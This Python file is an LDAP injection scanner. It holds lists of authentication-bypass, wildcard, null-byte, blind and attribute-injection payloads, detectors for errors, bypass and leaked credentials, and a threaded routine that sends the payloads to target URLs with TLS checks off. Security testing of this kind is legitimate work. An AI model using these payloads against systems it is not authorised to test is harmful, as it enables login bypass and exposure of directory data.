from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import threading
import time
import hashlib
import base64

class LDAPVulnerabilityType(Enum):
    LDAP_INJECTION = "ldap_injection"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    BLIND_LDAP_INJECTION = "blind_ldap_injection"
    ERROR_BASED_INJECTION = "error_based_injection"
    AND_OR_INJECTION = "and_or_injection"
    FILTER_BYPASS = "filter_bypass"
    ATTRIBUTE_INJECTION = "attribute_injection"
    DN_INJECTION = "dn_injection"
    WILDCARD_INJECTION = "wildcard_injection"
    NULL_BYTE_INJECTION = "null_byte_injection"
    UNICODE_BYPASS = "unicode_bypass"
    INFORMATION_DISCLOSURE = "information_disclosure"

class InjectionTechnique(Enum):
    OR_TRUE = "or_true"
    AND_TRUE = "and_true"
    WILDCARD = "wildcard"
    NULL_BYTE = "null_byte"
    COMMENT = "comment"
    FILTER_BYPASS = "filter_bypass"
    UNICODE_OBFUSCATION = "unicode_obfuscation"
    NESTED_FILTER = "nested_filter"

@dataclass
class LDAPPayload:
    payload: str
    injection_type: LDAPVulnerabilityType
    technique: InjectionTechnique
    description: str
    severity: str = "High"
    success_indicators: List[str] = field(default_factory=list)
    error_indicators: List[str] = field(default_factory=list)

@dataclass
class LDAPVulnerability:
    vulnerability_type: str
    ldap_type: LDAPVulnerabilityType
    url: str
    parameter: str
    payload: str
    severity: str
    evidence: str
    response_status: int
    response_size: int
    response_time: float
    authentication_bypassed: bool = False
    information_disclosed: bool = False
    ldap_errors: List[str] = field(default_factory=list)
    confirmed: bool = False
    confidence_score: float = 0.8
    remediation: str = ""
    timestamp: float = field(default_factory=time.time)

class MegaLDAPPayloadGenerator:
    @staticmethod
    def generate_auth_bypass_payloads() -> List[LDAPPayload]:
        payloads = []
        
        or_payloads = [
            '*',
            '*)(uid=*',
            '*)(|(uid=*',
            '*)(&(uid=*',
            'admin)(&(uid=*',
            '*)(cn=*',
            '*)(objectClass=*',
            '*))(|(cn=*',
        ]
        
        for payload in or_payloads:
            payloads.append(LDAPPayload(
                payload=payload,
                injection_type=LDAPVulnerabilityType.AUTHENTICATION_BYPASS,
                technique=InjectionTechnique.OR_TRUE,
                description=f'OR-based auth bypass: {payload}',
                severity='Critical',
                success_indicators=['success', 'welcome', 'dashboard', 'profile']
            ))
        
        and_payloads = [
            'admin)(&(password=*))',
            'admin)(&(uid=admin)',
            'admin))%00',
        ]
        
        for payload in and_payloads:
            payloads.append(LDAPPayload(
                payload=payload,
                injection_type=LDAPVulnerabilityType.AUTHENTICATION_BYPASS,
                technique=InjectionTechnique.AND_TRUE,
                description=f'AND-based auth bypass: {payload}',
                severity='Critical',
                success_indicators=['success', 'authenticated']
            ))
        
        return payloads
    
    @staticmethod
    def generate_injection_payloads() -> List[LDAPPayload]:
        payloads = []
        
        basic_injections = [
            '*)(&(objectClass=*',
            '*)(uid=*)(&(uid=*',
            '*)|(uid=*',
            '*))%00',
            '*)(cn=*))',
            '*))(|(objectClass=*',
        ]
        
        for payload in basic_injections:
            payloads.append(LDAPPayload(
                payload=payload,
                injection_type=LDAPVulnerabilityType.LDAP_INJECTION,
                technique=InjectionTechnique.FILTER_BYPASS,
                description=f'Filter bypass: {payload}',
                severity='High',
                error_indicators=['ldap', 'invalid', 'syntax', 'filter']
            ))
        
        wildcard_payloads = [
            'a*',
            'ad*',
            'adm*',
            'admin*',
            '*min',
            '*in',
        ]
        
        for payload in wildcard_payloads:
            payloads.append(LDAPPayload(
                payload=payload,
                injection_type=LDAPVulnerabilityType.WILDCARD_INJECTION,
                technique=InjectionTechnique.WILDCARD,
                description=f'Wildcard injection: {payload}',
                severity='Medium',
                success_indicators=['found', 'match', 'result']
            ))
        
        null_byte_payloads = [
            'admin%00',
            'admin\x00',
            'admin)%00',
            'admin))%00',
        ]
        
        for payload in null_byte_payloads:
            payloads.append(LDAPPayload(
                payload=payload,
                injection_type=LDAPVulnerabilityType.NULL_BYTE_INJECTION,
                technique=InjectionTechnique.NULL_BYTE,
                description=f'Null byte injection: {payload}',
                severity='High',
                success_indicators=['success', 'authenticated']
            ))
        
        return payloads
    
    @staticmethod
    def generate_error_based_payloads() -> List[LDAPPayload]:
        payloads = []
        
        error_payloads = [
            '(((',
            ')))',
            '*))',
            '((objectClass=*',
            '&(objectClass=*',
            '|(objectClass=*',
            '!(objectClass=*',
            '(objectClass=',
            '(uid=',
        ]
        
        for payload in error_payloads:
            payloads.append(LDAPPayload(
                payload=payload,
                injection_type=LDAPVulnerabilityType.ERROR_BASED_INJECTION,
                technique=InjectionTechnique.FILTER_BYPASS,
                description=f'Error-based injection: {payload}',
                severity='Medium',
                error_indicators=[
                    'ldap error', 'invalid syntax', 'malformed filter',
                    'ldap_search', 'ldap_bind', 'bad search filter'
                ]
            ))
        
        return payloads
    
    @staticmethod
    def generate_blind_injection_payloads() -> List[LDAPPayload]:
        payloads = []
        
        true_conditions = [
            'admin)(|(uid=*',
            'admin)(|(objectClass=*',
            '*',
        ]
        
        false_conditions = [
            'admin)(|(uid=nonexistent',
            'admin)(|(objectClass=invalid',
            'nonexistent',
        ]
        
        for i, (true_cond, false_cond) in enumerate(zip(true_conditions, false_conditions)):
            payloads.append(LDAPPayload(
                payload=true_cond,
                injection_type=LDAPVulnerabilityType.BLIND_LDAP_INJECTION,
                technique=InjectionTechnique.OR_TRUE,
                description=f'Blind injection (true condition): {true_cond}',
                severity='High',
                success_indicators=['different_response']
            ))
            
            payloads.append(LDAPPayload(
                payload=false_cond,
                injection_type=LDAPVulnerabilityType.BLIND_LDAP_INJECTION,
                technique=InjectionTechnique.OR_TRUE,
                description=f'Blind injection (false condition): {false_cond}',
                severity='High',
                success_indicators=['different_response']
            ))
        
        return payloads
    
    @staticmethod
    def generate_attribute_injection_payloads() -> List[LDAPPayload]:
        payloads = []
        
        attribute_payloads = [
            '*)(&(userPassword=*',
            '*)(&(password=*',
            '*)(&(admin=*',
            '*)(&(memberOf=*',
        ]
        
        for payload in attribute_payloads:
            payloads.append(LDAPPayload(
                payload=payload,
                injection_type=LDAPVulnerabilityType.ATTRIBUTE_INJECTION,
                technique=InjectionTechnique.FILTER_BYPASS,
                description=f'Attribute injection: {payload}',
                severity='High',
                success_indicators=['password', 'sensitive', 'admin']
            ))
        
        return payloads
    
    @staticmethod
    def generate_dn_injection_payloads() -> List[LDAPPayload]:
        payloads = []
        
        dn_payloads = [
            'cn=admin,dc=example,dc=com',
            'cn=*,dc=example,dc=com',
            'cn=admin)(uid=*',
            'ou=*,dc=example,dc=com',
        ]
        
        for payload in dn_payloads:
            payloads.append(LDAPPayload(
                payload=payload,
                injection_type=LDAPVulnerabilityType.DN_INJECTION,
                technique=InjectionTechnique.FILTER_BYPASS,
                description=f'DN injection: {payload}',
                severity='Medium',
                success_indicators=['found', 'result']
            ))
        
        return payloads
    
    @staticmethod
    def generate_unicode_bypass_payloads() -> List[LDAPPayload]:
        payloads = []
        
        unicode_payloads = [
            'admin\u0000',
            'admin\u00a0',
            'ad\u0000min',
            '\u0061dmin',
        ]
        
        for payload in unicode_payloads:
            payloads.append(LDAPPayload(
                payload=payload,
                injection_type=LDAPVulnerabilityType.UNICODE_BYPASS,
                technique=InjectionTechnique.UNICODE_OBFUSCATION,
                description=f'Unicode bypass: {payload}',
                severity='Medium',
                success_indicators=['success', 'authenticated']
            ))
        
        return payloads
    
    @staticmethod
    def generate_all_payloads() -> List[LDAPPayload]:
        all_payloads = []
        all_payloads.extend(MegaLDAPPayloadGenerator.generate_auth_bypass_payloads())
        all_payloads.extend(MegaLDAPPayloadGenerator.generate_injection_payloads())
        all_payloads.extend(MegaLDAPPayloadGenerator.generate_error_based_payloads())
        all_payloads.extend(MegaLDAPPayloadGenerator.generate_blind_injection_payloads())
        all_payloads.extend(MegaLDAPPayloadGenerator.generate_attribute_injection_payloads())
        all_payloads.extend(MegaLDAPPayloadGenerator.generate_dn_injection_payloads())
        all_payloads.extend(MegaLDAPPayloadGenerator.generate_unicode_bypass_payloads())
        return all_payloads

class MegaLDAPErrorDetector:
    ERROR_PATTERNS = {
        'ldap_error': re.compile(r'(?i)(ldap[\s_]error|ldap[\s_]bind|ldap[\s_]search)'),
        'invalid_syntax': re.compile(r'(?i)(invalid[\s_]syntax|malformed[\s_]filter|bad[\s_]search)'),
        'ldap_exception': re.compile(r'(?i)(ldapexception|javax\.naming\.directory)'),
        'filter_error': re.compile(r'(?i)(filter[\s_]error|invalid[\s_]filter)'),
        'dn_error': re.compile(r'(?i)(invalid[\s_]dn|dn[\s_]syntax)'),
        'attribute_error': re.compile(r'(?i)(undefined[\s_]attribute|no[\s_]such[\s_]attribute)'),
    }
    
    @staticmethod
    def detect_ldap_errors(response_content: str) -> Tuple[bool, List[str]]:
        errors_found = []
        
        for error_type, pattern in MegaLDAPErrorDetector.ERROR_PATTERNS.items():
            if pattern.search(response_content):
                errors_found.append(error_type)
        
        return bool(errors_found), errors_found

class MegaAuthBypassDetector:
    SUCCESS_INDICATORS = [
        'welcome', 'dashboard', 'profile', 'logout', 'account',
        'authenticated', 'login successful', 'success', 'home'
    ]
    
    @staticmethod
    def detect_auth_bypass(baseline_response: str, test_response: str, 
                          baseline_status: int, test_status: int) -> Tuple[bool, float, str]:
        
        if test_status in [200, 302, 303] and baseline_status in [401, 403]:
            return True, 0.95, 'Status code change indicates bypass'
        
        baseline_length = len(baseline_response)
        test_length = len(test_response)
        
        length_diff = abs(test_length - baseline_length)
        if length_diff > 500:
            return True, 0.8, f'Significant response size change: {length_diff} bytes'
        
        test_lower = test_response.lower()
        success_count = sum(1 for ind in MegaAuthBypassDetector.SUCCESS_INDICATORS if ind in test_lower)
        
        if success_count >= 2:
            return True, 0.85, f'Success indicators found: {success_count}'
        
        return False, 0.0, 'No bypass detected'

class MegaBlindInjectionDetector:
    @staticmethod
    def detect_blind_injection(true_response: str, false_response: str,
                               true_status: int, false_status: int,
                               true_time: float, false_time: float) -> Tuple[bool, float, str]:
        
        if true_status != false_status:
            return True, 0.9, 'Status code difference'
        
        length_diff = abs(len(true_response) - len(false_response))
        if length_diff > 100:
            return True, 0.85, f'Response length difference: {length_diff} bytes'
        
        time_diff = abs(true_time - false_time)
        if time_diff > 2:
            return True, 0.75, f'Response time difference: {time_diff:.2f}s'
        
        true_hash = hashlib.md5(true_response.encode()).hexdigest()
        false_hash = hashlib.md5(false_response.encode()).hexdigest()
        
        if true_hash != false_hash:
            return True, 0.7, 'Response content differs'
        
        return False, 0.0, 'No blind injection detected'

class MegaInformationDisclosureDetector:
    SENSITIVE_PATTERNS = {
        'username': re.compile(r'(?i)(uid|username|user|cn)[:=]\s*([a-zA-Z0-9_\-]+)'),
        'email': re.compile(r'\b[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}\b'),
        'dn': re.compile(r'(?i)(dn|distinguishedname)[:=]\s*([a-zA-Z0-9=,\s]+)'),
        'group': re.compile(r'(?i)(memberof|group)[:=]\s*([a-zA-Z0-9=,\s]+)'),
        'password_hash': re.compile(r'(?i)(userpassword|password)[:=]\s*([a-zA-Z0-9+/=]+)'),
    }
    
    @staticmethod
    def detect_information_disclosure(response_content: str) -> Tuple[bool, List[str], Dict]:
        disclosed = []
        findings = {}
        
        for data_type, pattern in MegaInformationDisclosureDetector.SENSITIVE_PATTERNS.items():
            matches = pattern.findall(response_content)
            if matches:
                disclosed.append(data_type)
                findings[data_type] = matches[:3]
        
        return bool(disclosed), disclosed, findings

class LDAPScanner:
    def __init__(self, max_workers: int = 18):
        self.payload_generator = MegaLDAPPayloadGenerator()
        self.error_detector = MegaLDAPErrorDetector()
        self.auth_detector = MegaAuthBypassDetector()
        self.blind_detector = MegaBlindInjectionDetector()
        self.info_detector = MegaInformationDisclosureDetector()
        
        self.vulnerabilities = []
        self.baseline_responses = {}
        self.lock = threading.Lock()
        self.max_workers = max_workers
    
    def scan(self, target_url: str, response: Dict, parameter: str,
             session=None, baseline_response: Optional[str] = None) -> List[LDAPVulnerability]:
        
        vulns = []
        
        if baseline_response is None:
            baseline_response = response.get('content', '')
        
        baseline_status = response.get('status_code', 0)
        
        payloads = self.payload_generator.generate_all_payloads()
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for payload in payloads[:120]:
                future = executor.submit(
                    self._test_payload,
                    target_url, parameter, payload, baseline_response, 
                    baseline_status, session
                )
                futures.append(future)
            
            for future in as_completed(futures):
                vuln = future.result()
                if vuln:
                    vulns.append(vuln)
        
        with self.lock:
            self.vulnerabilities.extend(vulns)
        
        return vulns
    
    def _test_payload(self, url: str, param: str, payload: LDAPPayload,
                     baseline: str, baseline_status: int, session) -> Optional[LDAPVulnerability]:
        
        if not session:
            return None
        
        try:
            test_url = f"{url}?{param}={payload.payload}"
            start = time.time()
            resp = session.get(test_url, timeout=10, verify=False)
            elapsed = time.time() - start
            
            content = resp.text
            status = resp.status_code
            
            has_errors, errors = self.error_detector.detect_ldap_errors(content)
            if has_errors:
                return self._create_vulnerability(
                    LDAPVulnerabilityType.ERROR_BASED_INJECTION,
                    url, param, payload.payload, f'LDAP errors detected: {", ".join(errors)}',
                    status, len(content), elapsed, 'Medium', 0.82, ldap_errors=errors
                )
            
            if payload.injection_type == LDAPVulnerabilityType.AUTHENTICATION_BYPASS:
                bypassed, conf, evidence = self.auth_detector.detect_auth_bypass(
                    baseline, content, baseline_status, status
                )
                if bypassed:
                    return self._create_vulnerability(
                        LDAPVulnerabilityType.AUTHENTICATION_BYPASS,
                        url, param, payload.payload, f'Auth bypass: {evidence}',
                        status, len(content), elapsed, 'Critical', conf,
                        authentication_bypassed=True
                    )
            
            disclosed, types, findings = self.info_detector.detect_information_disclosure(content)
            if disclosed:
                return self._create_vulnerability(
                    LDAPVulnerabilityType.INFORMATION_DISCLOSURE,
                    url, param, payload.payload,
                    f'Information disclosed: {", ".join(types)} | {str(findings)[:150]}',
                    status, len(content), elapsed, 'High', 0.88,
                    information_disclosed=True
                )
            
            if payload.injection_type == LDAPVulnerabilityType.BLIND_LDAP_INJECTION:
                is_blind, conf, evidence = self.blind_detector.detect_blind_injection(
                    content, baseline, status, baseline_status, elapsed, 1.0
                )
                if is_blind:
                    return self._create_vulnerability(
                        LDAPVulnerabilityType.BLIND_LDAP_INJECTION,
                        url, param, payload.payload, f'Blind injection: {evidence}',
                        status, len(content), elapsed, 'High', conf
                    )
            
        except Exception:
            pass
        
        return None
    
    def _create_vulnerability(self, ldap_type: LDAPVulnerabilityType, url: str, param: str,
                            payload: str, evidence: str, status: int, size: int, 
                            resp_time: float, severity: str, confidence: float,
                            **kwargs) -> LDAPVulnerability:
        
        return LDAPVulnerability(
            vulnerability_type='LDAP Vulnerability',
            ldap_type=ldap_type,
            url=url,
            parameter=param,
            payload=payload,
            severity=severity,
            evidence=evidence,
            response_status=status,
            response_size=size,
            response_time=resp_time,
            confirmed=True,
            confidence_score=confidence,
            remediation=self._get_remediation(),
            **kwargs
        )
    
    def _get_remediation(self) -> str:
        return (
            "1. Use parameterized LDAP queries. "
            "2. Validate and sanitize all inputs. "
            "3. Implement proper input escaping. "
            "4. Use allowlists for input validation. "
            "5. Implement least privilege access. "
            "6. Use secure LDAP libraries. "
            "7. Disable detailed error messages. "
            "8. Implement rate limiting. "
            "9. Monitor LDAP query patterns. "
            "10. Use LDAPS (LDAP over SSL/TLS)."
        )
    
    def get_vulnerabilities(self):
        with self.lock:
            return self.vulnerabilities.copy()
    
    def clear(self):
        with self.lock:
            self.vulnerabilities.clear()
            self.baseline_responses.clear()